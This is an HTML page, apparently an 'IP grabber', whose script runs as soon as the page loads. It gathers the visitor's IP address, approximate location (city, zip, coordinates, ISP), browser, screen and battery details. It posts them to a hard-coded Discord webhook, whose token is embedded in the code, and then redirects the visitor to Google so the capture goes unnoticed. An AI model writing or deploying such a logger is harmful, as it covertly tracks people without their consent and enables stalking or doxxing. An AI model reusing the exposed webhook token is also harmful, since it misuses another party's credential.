<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Visitor Info Logger</title>
</head>
<body>
    <h1>Gathering Information...</h1>
    <script>
        const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
        const redirectURL = 'https://www.google.com';

        // Function to fetch IP and location details
        async function getIPAddressAndLocation() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const { ip } = await response.json();
                const locationResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,isp,as,query`);
                const locationData = await locationResponse.json();

                return {
                    ip,
                    location: locationData.status === "success" ? locationData : null
                };
            } catch (error) {
                console.error('Error fetching IP or location:', error);
                return { ip: 'Unknown', location: null };
            }
        }

        // Function to collect additional browser and system information
        function getBrowserInfo() {
            const userAgent = navigator.userAgent;
            const browserName = (() => {
                if (userAgent.indexOf("Firefox") > -1) return "Mozilla Firefox";
                if (userAgent.indexOf("SamsungBrowser") > -1) return "Samsung Internet";
                if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) return "Opera";
                if (userAgent.indexOf("Trident") > -1) return "Microsoft Internet Explorer";
                if (userAgent.indexOf("Edge") > -1) return "Microsoft Edge";
                if (userAgent.indexOf("Chrome") > -1) return "Google Chrome";
                if (userAgent.indexOf("Safari") > -1) return "Apple Safari";
                return "Unknown";
            })();
            const platform = navigator.platform;
            const screenSize = `${window.screen.width}x${window.screen.height}`;
            const colorDepth = `${window.screen.colorDepth} bits`;
            const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";

            return `
                Browser: ${browserName}
                User-Agent: ${userAgent}
                Platform: ${platform}
                Screen Size: ${screenSize}
                Color Depth: ${colorDepth}
                Device Memory: ${deviceMemory}
            `;
        }

        // Function to collect hardware-specific information
        async function getHardwareInfo() {
            try {
                const battery = await navigator.getBattery();
                return `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
            } catch (error) {
                return "Battery information unavailable";
            }
        }

        // Function to send collected data to the Discord webhook
        async function sendToDiscord() {
            const { ip, location } = await getIPAddressAndLocation();
            const browserInfo = getBrowserInfo();
            const hardwareInfo = await getHardwareInfo();
            const timestamp = new Date().toLocaleString();

            const locationDetails = location
                ? `
                City: ${location.city}
                Region: ${location.regionName}
                Country: ${location.country}
                Zip: ${location.zip}
                Latitude: ${location.lat}
                Longitude: ${location.lon}
                ISP: ${location.isp}
                AS: ${location.as}
                `
                : "Location information unavailable";

            const payload = {
                embeds: [{
                    title: "Visitor Information Logged",
                    color: 3447003,
                    fields: [
                        { name: "IP Address", value: ip, inline: true },
                        { name: "Browser & System Info", value: `\`\`\`${browserInfo}\`\`\``, inline: false },
                        { name: "Hardware Info", value: `\`\`\`${hardwareInfo}\`\`\``, inline: true },
                        { name: "Approximate Location", value: `\`\`\`${locationDetails}\`\`\``, inline: false }
                    ],
                    footer: { text: `Logged at: ${timestamp}` }
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    console.log('Visitor info logged successfully');
                    window.location.href = redirectURL;
                } else {
                    console.error('Failed to log visitor info:', response.statusText);
                }
            })
            .catch(error => console.error('Error sending to webhook:', error));
        }

        // Execute the information collection and send it to the webhook
        sendToDiscord();
    </script>
</body>
</html>
